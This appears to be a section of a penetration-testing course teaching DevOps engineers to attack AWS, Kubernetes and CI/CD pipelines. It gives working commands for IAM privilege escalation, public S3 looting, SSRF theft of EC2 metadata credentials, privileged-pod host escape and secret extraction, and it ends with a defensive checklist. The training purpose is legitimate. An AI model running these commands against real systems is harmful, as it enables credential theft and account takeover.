# 06 — Cloud Security: Core Concepts & Attacker Thinking

> As a DevOps engineer, this is YOUR domain. You already know these services — now learn how attackers abuse them.

> 📋 **What You Will Do In This Section**
> - [ ] Enumerate AWS IAM permissions and find privilege escalation paths
> - [ ] Discover and exploit publicly accessible S3 buckets
> - [ ] Exploit EC2 metadata via SSRF to steal IAM credentials
> - [ ] Audit Kubernetes RBAC and escape privileged pods
> - [ ] Find secrets leaked in CI/CD pipelines and Git history
> - [ ] Build a cloud attack chain: SSRF → Metadata → Creds → Account Takeover

---

## 🔴 AWS Security

### IAM Misconfigurations

> 💡 **Why This Matters**
> IAM is the #1 AWS attack vector. A single over-permissive policy can turn a low-privilege user into an account admin. In 2023, IAM misconfiguration was the root cause of 40%+ of cloud breaches. If you understand IAM deeply, you can audit any AWS environment.

```
THE #1 AWS ATTACK VECTOR

IAM (Identity and Access Management) controls who can do what in AWS.
Misconfigurations here = complete account compromise.
```

#### Common IAM Misconfigurations

| Misconfiguration | Impact | How To Find |
|-----------------|--------|-------------|
| `*` permissions | Full account access | Check policy documents |
| Overly permissive roles | Privilege escalation | `aws iam list-attached-role-policies` |
| Unused access keys | Stale credentials | `aws iam list-access-keys` |
| No MFA on privileged accounts | Account takeover | `aws iam list-mfa-devices` |
| Cross-account trust too broad | Lateral movement | Check trust policies |
| Instance profiles with admin | EC2 compromise = admin | SSRF → metadata → creds |
| Hardcoded access keys | Leaked in code/logs | GitHub search, .env files |

#### AWS Privilege Escalation Paths

```bash
# 21 known IAM privilege escalation methods
# Reference: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/

# 1. iam:CreatePolicyVersion — Create new policy with admin perms
aws iam create-policy-version --policy-arn arn:aws:iam::ACCOUNT:policy/MyPolicy \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default

# 2. iam:AttachUserPolicy — Attach AdministratorAccess to yourself
aws iam attach-user-policy --user-name myuser --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 3. iam:PutUserPolicy — Inline policy with admin perms
aws iam put-user-policy --user-name myuser --policy-name AdminPolicy \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'

# 4. Lambda + iam:PassRole — Execute code as privileged role
aws lambda create-function --function-name backdoor \
  --runtime python3.9 --role arn:aws:iam::ACCOUNT:role/AdminRole \
  --handler lambda_function.handler --zip-file fileb://function.zip

# 5. sts:AssumeRole — Assume a more privileged role
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/AdminRole --role-session-name test
```

#### 🧪 Try It Now — AWS Identity Check

```bash
# Check your current AWS identity (if you have AWS CLI configured)
aws sts get-caller-identity 2>/dev/null || echo "AWS CLI not configured — install with: pip3 install awscli"
```

> ✅ **Expected Output**
> ```json
> {
>     "UserId": "AIDAXXXXXXXXXXXXXXXXX",
>     "Account": "123456789012",
>     "Arn": "arn:aws:iam::123456789012:user/your-username"
> }
> ```
> This tells you WHO you are in AWS. On a pentest, this is always step 1 after getting credentials.

### S3 Bucket Exposure

> 💡 **Why This Matters**
> Public S3 buckets have caused some of the largest data breaches in history (Capital One, Twitch, Pentagon). Companies store backups, logs, and configs in S3 — and often forget to restrict access. One public bucket can contain database dumps, API keys, and customer PII.

```bash
# Check if bucket exists and is public
aws s3 ls s3://target-bucket --no-sign-request
# If this works → publicly accessible!

# List bucket contents
aws s3 ls s3://target-bucket --no-sign-request --recursive

# Download everything
aws s3 sync s3://target-bucket ./loot --no-sign-request

# Common bucket naming patterns to test:
# target-backup, target-dev, target-staging, target-logs,
# target-assets, target-data, target-uploads, target-config
```

#### 🧪 Try It Now — S3 Bucket Check

```bash
echo "=== S3 Bucket Naming Patterns ==="
echo "Replace 'TARGET' with the company name:"
echo ""
for suffix in backup dev staging logs data uploads config assets internal; do
  echo "  aws s3 ls s3://TARGET-$suffix --no-sign-request"
done
echo ""
echo "Also try: TARGET.com, www.TARGET.com, api.TARGET.com"
echo ""
echo "Practice target: http://flaws.cloud/ (AWS security challenge)"
```

### EC2 Metadata Service (SSRF Target)

> 💡 **Why This Matters**
> The EC2 metadata service at `169.254.169.254` returns IAM credentials for the instance's role. If you find an SSRF vulnerability in a web app running on EC2, you can steal these credentials and use them to access other AWS services. This was the attack vector in the Capital One breach.

```bash
# IMDSv1 (easy to exploit via SSRF)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# Returns: AccessKeyId, SecretAccessKey, Token

# Use stolen credentials
export AWS_ACCESS_KEY_ID=stolen_key
export AWS_SECRET_ACCESS_KEY=stolen_secret
export AWS_SESSION_TOKEN=stolen_token
aws sts get-caller-identity  # Verify access
```

> ✅ **Expected Output (from SSRF exploit)**
> ```json
> {
>   "Code": "Success",
>   "AccessKeyId": "ASIAXXXXXXXXXXX",
>   "SecretAccessKey": "xxxxxxxxxxxxxxxxxxxxxxxx",
>   "Token": "long-session-token...",
>   "Expiration": "2024-01-15T12:00:00Z"
> }
> ```
> These are temporary IAM credentials that give you the EC2 instance's role permissions!

> 🔧 **If Stuck**
> - SSRF blocked → Try different URL encodings: `http://0xA9FEA9FE` (hex for 169.254.169.254)
> - IMDSv2 (harder) → Requires a PUT request with token header first. Can't exploit via simple GET SSRF.
> - No role attached → The instance has no IAM role. Check user-data instead: `curl http://169.254.169.254/latest/user-data/`

### AWS Enumeration (With Credentials)

```bash
# Who am I?
aws sts get-caller-identity

# Enumerate permissions (use enumerate-iam tool)
pip3 install enumerate-iam
python3 enumerate-iam.py --access-key KEY --secret-key SECRET

# Or manually:
aws iam list-users
aws iam list-roles
aws s3 ls
aws ec2 describe-instances
aws lambda list-functions
aws secretsmanager list-secrets
aws ssm describe-parameters
```

---

## 🔴 Kubernetes Security

### RBAC Misconfigurations

> 💡 **Why This Matters**
> Kubernetes RBAC controls who can do what in the cluster. If a service account has `cluster-admin` privileges (common in dev environments), compromising ANY pod in that namespace gives you full cluster control — every secret, every pod, every node.

```bash
# Check your permissions
kubectl auth can-i --list

# Common dangerous permissions:
# pods/exec → Execute commands in any pod
# secrets → Read all secrets (service account tokens, DB passwords)
# create pods → Create privileged pods to escape to host
# * on * → Full admin access

# Check for cluster-admin bindings
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name=="cluster-admin") | .metadata.name + " → " + (.subjects[]?.name // "unknown")'
```

#### 🧪 Try It Now — Kubernetes RBAC Check

```bash
# If you have kubectl configured:
echo "=== Kubernetes RBAC Audit ==="
kubectl auth can-i --list 2>/dev/null | head -20 || echo "kubectl not configured"
echo ""
echo "=== Dangerous Permissions to Look For ==="
echo "  pods/exec     → Shell into any pod"
echo "  secrets       → Read all secrets"
echo "  create pods   → Create privileged pods → escape to host"
echo "  * on *        → Full admin (game over)"
```

### Pod Escape

```bash
# Check if pod is privileged
cat /proc/1/status | grep -i cap
# CapEff: 0000003fffffffff → All capabilities = privileged pod

# Escape Method 1: nsenter to host
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
# You're now on the host!

# Escape Method 2: Create privileged pod
cat << 'EOF' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: exploit
spec:
  containers:
  - name: exploit
    image: ubuntu
    command: ["sleep", "infinity"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
  hostPID: true
  hostNetwork: true
EOF

kubectl exec -it exploit -- chroot /host /bin/bash
# Root on the node!
```

### Secrets Exposure

```bash
# List all secrets
kubectl get secrets --all-namespaces

# Read and decode a secret
kubectl get secret SECRET_NAME -o jsonpath='{.data.password}' | base64 -d

# Find secrets in pod environment variables
kubectl get pods -o json | jq -r '.items[].spec.containers[].env[]? | select(.valueFrom.secretKeyRef) | .name + " → " + .valueFrom.secretKeyRef.name'
```

### Kubernetes Attack Checklist

```
□ Anonymous access to API server?
  curl -k https://APISERVER:6443/api/v1/
□ Dashboard exposed without auth?
  curl -k https://APISERVER:30000/
□ etcd exposed? (port 2379)
  curl -k https://ETCD_IP:2379/v2/keys
□ Kubelet API exposed? (port 10250)
  curl -k https://NODE_IP:10250/pods
□ Service account with excessive permissions?
□ Secrets readable?
□ Can create privileged pods?
□ Network policies in place?
```

---

## 🔴 CI/CD Pipeline Security

> 💡 **Why This Matters**
> CI/CD pipelines have access to production credentials, deployment keys, and infrastructure. A compromised pipeline = compromised production. Attackers target pipelines because they're often the least-audited part of the infrastructure — and they contain the keys to everything.

### Secret Leaks

```
COMMON PLACES SECRETS LEAK:
├── Git commit history → git log --all -p | grep -iE "password|secret|key|token"
├── CI/CD environment variables → printed in build logs
├── Docker images → build-time secrets baked into layers
├── Configuration files committed → .env, config.yml, secrets.yaml
├── Error messages → Stack traces include connection strings
└── Dependency manifests → Private registry tokens
```

#### 🧪 Try It Now — Secret Scanning

```bash
# Scan any git repository for secrets
echo "=== Secret Scanning Commands ==="
echo ""
echo "Using trufflehog:"
echo "  trufflehog git https://github.com/your-org/your-repo.git"
echo ""
echo "Using gitleaks:"
echo "  gitleaks detect --source=./your-repo"
echo ""
echo "Manual git history search:"
echo "  git log --all -p | grep -iE 'password|secret|api_key|token|AWS_' | head -20"
echo ""
echo "Practice: Scan your own repos first!"
```

### Pipeline Abuse Vectors

```bash
# 1. Poisoned Pull Request → Modify CI config to exfiltrate secrets
# 2. Dependency Confusion → Public package same name as internal
# 3. Docker Layer Extraction → Pull image, extract layers, grep for secrets
docker save target/app:latest -o image.tar
tar xf image.tar
find . -name "*.tar" -exec tar xf {} \;
grep -rn "password\|secret\|key\|token" . 2>/dev/null
```

---

## 🔴 Cloud Attack Cheatsheet

```
AWS ATTACK CHAIN:
SSRF → Metadata → IAM creds → Enumerate permissions → Privilege escalation → Account takeover

KUBERNETES ATTACK CHAIN:
Exposed dashboard → Default creds → Pod shell → Service account token → Secrets → Node escape

CI/CD ATTACK CHAIN:
Code access → Pipeline modification → Secret extraction → Infrastructure compromise
```

---

## 📋 Cloud Security Checklist

```
AWS:
□ IAM users with console access have MFA
□ Root account has MFA and no access keys
□ No * permissions in IAM policies
□ S3 buckets not publicly accessible
□ CloudTrail logging enabled
□ EC2 instances use IMDSv2
□ Secrets in Secrets Manager, not env vars

KUBERNETES:
□ API server not publicly exposed
□ Dashboard requires authentication
□ RBAC properly configured
□ Pod Security Standards enforced
□ Secrets encrypted at rest
□ Network Policies implemented

CI/CD:
□ Secrets not printed in build logs
□ Fork PRs don't have access to secrets
□ Dependencies pinned (not using latest)
□ No secrets in codebase
□ Docker images scanned for vulnerabilities
```

---

## 🧠 If You're Stuck

1. **No AWS environment to test**: Use CloudGoat (free) or flaws.cloud challenges
2. **kubectl not working**: Check if kubeconfig exists: `ls ~/.kube/config`. Use Minikube for local testing.
3. **Secret scanning finds too much noise**: Use `--only-verified` flag with trufflehog for confirmed-working secrets only
4. **Don't know which IAM escalation path to use**: Run Pacu's `iam__privesc_scan` — it checks all 21 methods automatically
5. **SSRF doesn't reach metadata**: Modern AWS uses IMDSv2 which requires a PUT token request first. Check for alternative internal endpoints.

---

## 🧠 Section 06 Complete — Self-Check

Before moving to `07-ctf-writeups/`, verify you can:

- [ ] Run `aws sts get-caller-identity` and interpret the output
- [ ] List S3 buckets and check for public access
- [ ] Explain the SSRF → metadata → credential theft attack chain
- [ ] Check Kubernetes RBAC permissions with `kubectl auth can-i --list`
- [ ] Scan a git repository for leaked secrets
- [ ] Name 3 IAM privilege escalation methods
